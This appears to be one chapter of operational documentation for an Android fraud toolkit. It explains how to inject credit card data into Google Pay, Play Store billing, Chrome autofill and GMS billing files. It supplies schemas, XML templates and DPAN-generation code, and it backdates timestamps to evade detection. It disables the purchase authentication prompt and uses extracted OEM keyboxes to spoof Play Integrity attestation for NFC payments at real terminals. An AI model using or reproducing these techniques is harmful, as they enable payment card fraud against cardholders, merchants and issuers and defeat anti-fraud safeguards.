# 05 — Wallet Injection

The `WalletProvisioner` class (`core/wallet_provisioner.py`) injects credit card data into four targets: Google Pay (`tapandpay.db`), Play Store billing (`COIN.xml`), Chrome autofill (`Web Data`), and GMS billing state. Post-injection, `WalletVerifier` runs a 13-check deep verification.

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [Target 1 — Google Pay (tapandpay.db)](#2-target-1--google-pay-tapandpaydb)
3. [Target 2 — Play Store Billing (COIN.xml)](#3-target-2--play-store-billing-coinxml)
4. [Target 3 — Chrome Autofill (Web Data)](#4-target-3--chrome-autofill-web-data)
5. [Target 4 — GMS Billing Sync](#5-target-4--gms-billing-sync)
6. [DPAN Generation](#6-dpan-generation)
7. [NFC Configuration](#7-nfc-configuration)
8. [Keybox & Play Integrity](#8-keybox--play-integrity)
9. [GSF Fingerprint Alignment](#9-gsf-fingerprint-alignment)
10. [Post-Injection Verification (WalletVerifier)](#10-post-injection-verification-walletverifier)
11. [Samsung Pay — Why It Cannot Work](#11-samsung-pay--why-it-cannot-work)
12. [Wallet Support Matrix](#12-wallet-support-matrix)
13. [Success Rate Analysis](#13-success-rate-analysis)
14. [API Endpoints](#14-api-endpoints)

---

## 1. Architecture Overview

```
WalletProvisioner.provision_card()
  │
  ├── [1] _provision_google_pay()      → tapandpay.db (tokens + token_metadata)
  │                                    → nfc_on_prefs.xml + default_settings.xml
  │
  ├── [2] _provision_play_store()      → COIN.xml (billing prefs)
  │
  ├── [3] _provision_chrome_autofill() → Web Data (credit_cards table)
  │
  ├── [4] _provision_gms_billing()     → wallet_instrument_prefs.xml
  │                                    → payment_profile_prefs.xml
  │
  └── [5] _verify_wallet_injection()   → 7-point post-check
              │
              └── WalletVerifier.verify() → 13-point deep check
```

**Success threshold:** `wallet_ok = (success_count >= 3)`  
**Log output:** `Wallet: 4/4 targets | verification: 92`

---

## 2. Target 1 — Google Pay (tapandpay.db)

**Primary path:** `/data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db`
**Fallback path:** `/data/data/com.google.android.gms/databases/tapandpay.db`

The `tapandpay.db` is the core Google Pay database. It stores tokenized card data (DPANs — Device Primary Account Numbers) used for NFC contactless payments.

**Dual-path check (GAP-P11):** `WalletVerifier` and `TaskVerifier` now check both `walletnfcrel` (primary) and `gms` (fallback) paths, since different GMS versions store `tapandpay.db` in different packages.

### Process Flow

```
1. am force-stop com.google.android.apps.walletnfcrel  (prevent DB locks)
2. Build tapandpay.db locally with Python sqlite3
3. adb push tapandpay.db → device temp path
4. mv to final path
5. chown {wallet_uid}:{wallet_uid} + chmod 660 + restorecon
6. am start com.google.android.apps.walletnfcrel  (restart wallet)
```

### tokens Table Schema (24 columns)

```sql
CREATE TABLE tokens (
    id                              INTEGER PRIMARY KEY AUTOINCREMENT,
    dpan                            TEXT NOT NULL,        -- Tokenized PAN
    fpan_last4                      TEXT NOT NULL,        -- Real card last 4
    card_network                    INTEGER NOT NULL,     -- 3=Visa, 4=MC, 5=Amex, 6=Discover
    card_description                TEXT,                 -- "Visa •••• 4242"
    issuer_name                     TEXT,                 -- "Chase", "Bank of America"
    issuer_id                       TEXT DEFAULT '',
    funding_source_id               TEXT DEFAULT '',      -- UUID4
    card_art_url                    TEXT DEFAULT '',      -- Google CDN art URL
    card_art_fife_url               TEXT DEFAULT '',      -- FIFE art URL
    token_reference_id              TEXT DEFAULT '',      -- "DNITHE{12hex}"
    last_four_of_fpan               TEXT DEFAULT '',
    dpan_last_four                  TEXT DEFAULT '',
    terms_and_conditions_accepted   INTEGER DEFAULT 1,
    expiry_month                    INTEGER,
    expiry_year                     INTEGER,
    card_color                      INTEGER DEFAULT -1,
    is_default                      INTEGER DEFAULT 0,    -- 1 = default card
    status                          INTEGER DEFAULT 1,    -- 1 = active
    token_service_provider          INTEGER DEFAULT 1,    -- 1 = Google
    token_type                      TEXT DEFAULT 'CLOUD', -- CLOUD | DEVICE
    wallet_account_id               TEXT DEFAULT '',      -- UUID4
    device_type                     TEXT DEFAULT 'PHONE',
    created_timestamp               INTEGER,              -- Unix ms
    last_used_timestamp             INTEGER               -- Unix ms
);
```

### token_metadata Table Schema

```sql
CREATE TABLE token_metadata (
    token_id                INTEGER PRIMARY KEY,
    token_state             TEXT DEFAULT 'ACTIVE',
    token_pan               TEXT,              -- Same as dpan
    token_expiry            TEXT,              -- "MM/YYYY"
    token_requestor_id      TEXT DEFAULT 'GOOGLE_PAY',
    provisioning_status     TEXT DEFAULT 'PROVISIONED',
    token_type              TEXT DEFAULT 'CLOUD',
    last_updated_timestamp  INTEGER,
    FOREIGN KEY (token_id) REFERENCES tokens(id)
);
```

### Additional Tables

```sql
-- Session management (prevents "Session expired" errors)
CREATE TABLE session_keys (
    id              INTEGER PRIMARY KEY,
    token_id        INTEGER,
    session_key     TEXT,
    created_time    INTEGER
);
INSERT INTO session_keys VALUES (1, 1, '{random_hex_32}', {now_ms});

-- Required empty tables for schema compatibility
CREATE TABLE billing_prefs (key TEXT, value TEXT);
CREATE TABLE enrollment_info (token_id INTEGER, enrollment_data TEXT);
```

### Card Network IDs

| ID | Network | Typical Issuers |
|----|---------|----------------|
| 3 | Visa | Chase, Bank of America, Wells Fargo, Capital One |
| 4 | Mastercard | Citi, Chase, Barclays, HSBC |
| 5 | American Express | AmEx directly |
| 6 | Discover | Discover Financial |

---

## 3. Target 2 — Play Store Billing (COIN.xml)

**Path:** `/data/data/com.android.vending/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml`

The COIN.xml file controls how the Play Store presents payment methods and whether purchases require authentication.

### Complete COIN.xml Structure

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <!-- Core payment method presence -->
    <boolean name="has_payment_method" value="true" />
    <string name="payment_method_type">CREDIT_CARD</string>
    <string name="default_instrument_id">{funding_source_id}</string>

    <!-- Card display info -->
    <string name="instrument_last_four">{last4}</string>
    <string name="instrument_brand">VISA</string>
    <string name="instrument_expiry_month">{exp_month}</string>
    <string name="instrument_expiry_year">{exp_year}</string>
    <string name="instrument_family">VISA</string>

    <!-- Authentication bypass -->
    <boolean name="purchase_requires_auth" value="false" />
    <boolean name="require_purchase_auth" value="false" />
    <string name="auth_token">{random_hex_32}</string>

    <!-- Account binding -->
    <string name="account_name">{persona_email}</string>
    <string name="account_type">com.google</string>

    <!-- Terms/consent -->
    <boolean name="tos_accepted" value="true" />
    <long name="tos_accepted_time" value="{now_ms}" />

    <!-- Billing state -->
    <boolean name="billing_supported" value="true" />
    <boolean name="billing_supported_subscriptions" value="true" />
    <string name="google_play_billing_version">6.0.0</string>

    <!-- Sync timestamps (prevent stale-state detection) -->
    <long name="last_sync_time" value="{now_ms}" />
    <long name="instruments_update_time" value="{now_ms}" />
</map>
```

**Key field: `purchase_requires_auth=false`**  
This disables the Google account password prompt before in-app purchases, making the injected payment method immediately usable without additional authentication challenges.

---

## 4. Target 3 — Chrome Autofill (Web Data)

**Path:** `/data/data/com.android.chrome/app_chrome/Default/Web Data`

```sql
-- credit_cards table in Web Data
CREATE TABLE credit_cards (
    guid                TEXT PRIMARY KEY,
    name_on_card        TEXT,
    expiration_month    INTEGER,
    expiration_year     INTEGER,
    card_number_encrypted BLOB,  -- Left empty (placeholder)
    date_modified       INTEGER,
    origin              TEXT,
    use_count           INTEGER DEFAULT 3,
    use_date            INTEGER,
    billing_address_id  TEXT,
    nickname            TEXT
);
```

**Note on encryption:** Chrome encrypts card numbers with the OS Keystore. We write placeholder empty bytes for `card_number_encrypted`. The card still appears as a suggestion in Chrome's autofill dropdown (showing the issuer and last 4 digits) but Chrome will prompt for CVV before auto-filling the full number.

**Success rate:** ~85% visible in autofill, ~40% usable for one-click checkout (depends on site's CVV requirement).

---

## 5. Target 4 — GMS Billing Sync

**Paths:**
- `/data/data/com.google.android.gms/shared_prefs/wallet_instrument_prefs.xml`
- `/data/data/com.google.android.gms/shared_prefs/payment_profile_prefs.xml`

These files establish GMS ecosystem coherence — ensuring that Google's account services recognize the device as having an active payment method synchronized from the cloud.

### wallet_instrument_prefs.xml

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="wallet_setup_complete" value="true" />
    <string name="wallet_account">{persona_email}</string>
    <string name="default_instrument_id">{funding_source_id}</string>
    <long name="last_sync_timestamp" value="{now_ms}" />
    <boolean name="nfc_payment_enabled" value="true" />
    <string name="wallet_environment">PRODUCTION</string>
</map>
```

### payment_profile_prefs.xml

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="payment_methods_synced" value="true" />
    <string name="profile_email">{persona_email}</string>
    <long name="last_sync_time" value="{now_ms}" />
    <boolean name="has_billing_address" value="true" />
    <string name="payment_profile_id">{uuid4}</string>
</map>
```

---

## 6. DPAN Generation

A DPAN (Device Primary Account Number) is a tokenized surrogate for the real card number. It must be:
1. Luhn-valid (passes standard checksum check)
2. Network-appropriate prefix
3. Different from the real PAN
4. 16 digits (Visa/MC/Discover) or 15 digits (Amex)

```python
def _generate_dpan(self, card_network: int, fpan: str) -> str:
    """Generate a Luhn-valid DPAN that differs from the FPAN."""
    network_prefixes = {
        3: "4",    # Visa tokenized: starts with 4
        4: "5",    # Mastercard tokenized: starts with 5
        5: "3",    # Amex tokenized: starts with 3
        6: "6",    # Discover tokenized: starts with 6
    }
    prefix = network_prefixes.get(card_network, "4")
    length = 15 if card_network == 5 else 16
    body = prefix + "".join([str(random.randint(0, 9)) for _ in range(length - 2)])
    dpan = _luhn_checksum(body)
    # Ensure DPAN != FPAN (astronomically unlikely but verify)
    return dpan if dpan != fpan else _generate_dpan(card_network, fpan)
```

**Backdating:** `created_timestamp` is set to `now - random(7..30 days)` and `last_used_timestamp` is set to `now - random(0..7 days)`. This makes the token look like it was provisioned weeks ago and recently used — not freshly injected.

---

## 7. NFC Configuration

Two files configure Google Wallet's NFC tap-and-pay readiness:

### nfc_on_prefs.xml

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="nfc_enabled" value="true" />
    <boolean name="tap_and_pay_enabled" value="true" />
    <string name="default_payment_app">com.google.android.apps.walletnfcrel</string>
    <boolean name="payment_default_changed" value="false" />
</map>
```

**Path:** `/data/data/com.google.android.apps.walletnfcrel/shared_prefs/nfc_on_prefs.xml`

### default_settings.xml

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="nfc_payment_default_set" value="true" />
    <string name="nfc_payment_component">
        com.google.android.apps.walletnfcrel/.tap.HceDelegateService
    </string>
    <long name="nfc_setup_timestamp" value="{now_ms}" />
</map>
```

Additionally, the system NFC setting is enabled:
```bash
settings put secure nfc_on 1
settings put secure nfc_payment_foreground 1
setprop persist.titan.nfc.enabled 1
```

---

## 8. Keybox & Play Integrity

### Why Keybox Matters for Wallet

Google Pay NFC tap-and-pay requires the device to pass **Play Integrity Device** or **Play Integrity Strong** attestation at transaction time. The attestation hierarchy:

```
Play Integrity Basic    ← Passes with patched props only (100%)
Play Integrity Device   ← Requires correct fingerprint + boot state (~95%)
Play Integrity Strong   ← Requires hardware keybox from TEE (~75% with valid KB)
```

**Without a keybox:** Wallet will inject successfully (file-level), but Google's payment server may reject the NFC transaction if it demands Strong attestation. Most standard merchants only require Device, so wallet injection works without keybox for ~85% of payment scenarios.

### Keybox Setup

```bash
# Place your hardware keybox at:
/opt/titan/data/keybox.xml

# Or set environment variable:
export TITAN_KEYBOX_PATH=/path/to/your/keybox.xml
```

The anomaly patcher's Phase 11b (`_patch_keybox`) pushes it to:
```
/data/adb/tricky_store/keybox.xml
/data/adb/modules/playintegrityfix/keybox.xml
/data/adb/modules/tricky_store/keybox.xml
```

### keybox.xml Structure

```xml
<AndroidAttestation>
    <NumberOfKeyboxes>1</NumberOfKeyboxes>
    <Keybox DeviceID="{device_id}">
        <Key algorithm="ecdsa">
            <PrivateKey format="pem">
                -----BEGIN EC PRIVATE KEY-----
                {base64_private_key}
                -----END EC PRIVATE KEY-----
            </PrivateKey>
            <CertificateChain>
                <NumberOfCertificates>3</NumberOfCertificates>
                <Certificate format="pem">
                    {leaf_cert}
                </Certificate>
                <Certificate format="pem">
                    {intermediate_cert}
                </Certificate>
                <Certificate format="pem">
                    {root_cert}
                </Certificate>
            </CertificateChain>
        </Key>
    </Keybox>
</AndroidAttestation>
```

**Source of keyboxes:** Hardware keyboxes are extracted from OEM firmware signing chains. They become revoked when Google detects misuse. Rotate keyboxes periodically.

---

## 9. GSF Fingerprint Alignment

Covered in full in [02-anomaly-patcher.md §Phase 11c](02-anomaly-patcher.md). Summary:

The GSF (Google Services Framework) maintains a separate `deviceId` from `android_id`. Misalignment causes:
- Play Integrity score degradation
- Google Wallet server-side identity reconciliation failure
- GMS checkin failure (breaks cloud sync)

The patcher writes `CheckinService.xml` and `GservicesSettings.xml` with aligned IDs, owned by the GMS UID with correct SELinux labels.

---

## 10. Post-Injection Verification (WalletVerifier)

`WalletVerifier` (`core/wallet_verifier.py`) runs 13 checks after provisioning and also exposes `GET /api/stealth/{device_id}/wallet-verify`.

### The 13 Checks

| # | Check Name | What It Verifies | Remediation if Failed |
|---|-----------|-----------------|----------------------|
| 1 | `tapandpay_db_exists` | tapandpay.db file present | Re-run WalletProvisioner |
| 2 | `tapandpay_token_count` | ≥1 token in tokens table | No tokens injected — check card data |
| 3 | `token_provisioning_status` | `token_metadata.provisioning_status = 'PROVISIONED'` | token_metadata INSERT failed |
| 4 | `nfc_prefs_enabled` | nfc_on_prefs.xml has `nfc_enabled=true` | Re-run Google Pay provisioning |
| 5 | `coin_xml_payment_method` | COIN.xml has `has_payment_method=true` | Re-run Play Store provisioning |
| 6 | `coin_auth_disabled` | COIN.xml has `purchase_requires_auth=false` | Update COIN.xml |
| 7 | `chrome_webdata_exists` | Chrome Web Data file exists | Re-run Chrome autofill provisioning |
| 8 | `gms_wallet_synced` | `wallet_setup_complete=true` in GMS prefs | Re-run GMS billing sync |
| 9 | `gms_payment_profile_synced` | `payment_methods_synced=true` | Re-run GMS billing sync |
| 10 | `keybox_loaded` | `persist.titan.keybox.loaded=1` | Place keybox.xml and re-run patcher |
| 11 | `gsf_fingerprint_aligned` | CheckinService.xml exists with `deviceId` | Re-run Phase 11c (GSF alignment) |
| 12 | `tapandpay_ownership` | tapandpay.db owner matches wallet app UID | Fix chown + restorecon |
| 13 | `system_nfc_enabled` | `settings get secure nfc_on = 1` | `settings put secure nfc_on 1` |

### Verification Report Structure

```json
{
    "device_target": "127.0.0.1:6520",
    "timestamp": 1710384000.0,
    "score": 92,
    "grade": "A",
    "passed": 12,
    "total": 13,
    "samsung_pay": "Samsung Pay is NOT supported...",
    "checks": [
        {
            "name": "tapandpay_db_exists",
            "passed": true,
            "detail": "Found: /data/data/.../tapandpay.db",
            "remediation": ""
        },
        {
            "name": "keybox_loaded",
            "passed": false,
            "detail": "Keybox NOT loaded",
            "remediation": "Place keybox.xml at /opt/titan/data/keybox.xml and re-run anomaly patcher..."
        }
    ]
}
```

### Grade Scale

| Score | Grade |
|-------|-------|
| 95–100 | A+ |
| 85–94 | A |
| 70–84 | B |
| 50–69 | C |
| 0–49 | F |

---

## 11. Samsung Pay — Why It Cannot Work

Samsung Pay uses hardware-fused security that **cannot be bypassed in software**, regardless of root access or firmware modification.

### Knox TEE Architecture

```
ARM TrustZone (TEE)
  └── Samsung Knox
        ├── e-fuse "warranty bit" (hardware, physically irreversible)
        │     0x0 = untampered (Knox ACTIVE)
        │     0x1 = tampered  (Knox VOIDED — permanently, cannot reset)
        ├── spayfw_enc.db    — Hardware-AES-256 encrypted with TEE-bound key
        └── PlccCardData_enc.db — Same encryption, key lives in TrustZone
```

### Why Each Attack Vector Fails

| Attack Vector | Why It Fails |
|--------------|-------------|
| Modify `spayfw_enc.db` directly | AES-256 key is bound to TEE hardware; cannot decrypt or re-encrypt without the key |
| Inject via App-to-App Push Provisioning (OPC) | OPC path calls TEE token write API; TEE checks e-fuse = 0x1 and rejects |
| Patch Knox attestation | Knox attestation key is fused into hardware; cannot be spoofed in software |
| Disable Knox check in firmware | Verified boot + hardware e-fuse prevents firmware modification |
| Use rooted APK | Knox detects root via e-fuse before any SDK call completes |

**The verdict:** When a device is rooted, unlocked, or runs custom firmware, the Knox warranty bit is physically burned to `0x1`. ARM TrustZone hardware enforces this check before any secure storage access. **No software modification can overcome a hardware e-fuse.**

---

## 12. Wallet Support Matrix

| Wallet | Status | Success Rate | Method | Limitation |
|--------|--------|-------------|--------|-----------|
| **Google Pay** | ✅ Supported | ~100% file inject | tapandpay.db + NFC prefs + COIN.xml + GMS sync | NFC payment requires Play Integrity Device+ |
| **Chrome Autofill** | ⚠️ Partial | ~85% visible | Web Data DB injection | Encrypted value field; CVV required at checkout |
| **Play Store Billing** | ✅ Supported | ~99% | COIN.xml injection | `purchase_requires_auth=false` bypasses auth |
| **Samsung Pay** | ❌ Impossible | 0% | — | Knox TEE hardware e-fuse (permanent) |
| **PayPal (app)** | ⚠️ Partial | ~60% | SharedPrefs + session cookie | Requires active login session |
| **Apple Pay** | ❌ N/A | 0% | — | iOS only |

---

## 13. Success Rate Analysis

### File Injection vs. Activation

It's important to distinguish two success levels:

**Level 1 — File Injection Success (~100%)**
The database and preferences files are correctly written to the device with proper ownership. `WalletVerifier` reports 13/13 passed.

**Level 2 — Transaction Activation (~75–95%)**
The injected Google Wallet successfully processes an NFC tap payment at a real terminal. Depends on:

| Factor | Impact |
|--------|--------|
| Play Integrity level | Device (~95% merchants) vs Strong (~75%) |
| Keybox freshness | Revoked keybox = Strong fails |
| GSF alignment | Misalignment = backend reconciliation failure |
| Device fingerprint | pixel_9_pro highest pass rate |
| Card validity | Real BIN + valid expiry required |

### Highest-Success Device Fingerprints

1. **`pixel_9_pro`** — Native Google hardware; Play Integrity chain optimized for Pixel devices; highest Strong pass rate
2. **`samsung_s25_ultra`** — Highest market share = largest enrolled keybox pool; Samsung ecosystem trust
3. **`oneplus_13`** — Recent Snapdragon 8 Gen 3; clean fingerprint history; strong Device attestation

---

## 14. API Endpoints

| Method | Path | Description |
|--------|------|-------------|
| `POST` | `/api/genesis/inject/{device_id}` | Full profile inject including wallet |
| `GET` | `/api/stealth/{device_id}/wallet-verify` | 13-check wallet deep verification |
| `GET` | `/api/genesis/trust-score/{device_id}` | Trust score (includes wallet check) |

### Wallet-Verify Response

```bash
curl https://72.62.72.48/api/stealth/dev-a3f12b/wallet-verify
```

```json
{
    "score": 92,
    "grade": "A",
    "passed": 12,
    "total": 13,
    "checks": [...]
}
```

---

*See [06-ai-agent.md](06-ai-agent.md) for the AI agent that can automate post-injection wallet activation flows.*
